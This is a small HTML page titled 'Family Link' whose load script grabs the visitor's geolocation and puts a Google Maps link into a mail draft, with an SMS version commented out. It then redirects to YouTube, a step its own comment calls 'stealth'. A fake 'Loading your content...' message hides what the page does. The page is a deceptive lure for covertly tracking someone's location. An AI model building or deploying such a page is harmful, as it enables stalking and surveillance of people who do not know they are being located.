<!DOCTYPE html>
<html>
<head>
    <title>Family Link</title>
    <script>
        function sendLocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const link = `https://www.google.com/maps?q=${lat},${lng}`;
                
                // Method 1: Open user's email client (no API needed)
                window.open(`mailto:?subject=My Location&body=I'm here: ${link}`);
                
                // Method 2: Send SMS (works on mobile)
                // window.open(`sms:?body=I'm here: ${link}`);
                
                // Redirect to YouTube (stealth)
                setTimeout(() => { window.location.href = "https://youtube.com"; }, 500);
            });
        }
    </script>
</head>
<body onload="sendLocation()">
    <!-- Show a fake loading screen -->
    <h2>Loading your content...</h2>
</body>
</html>
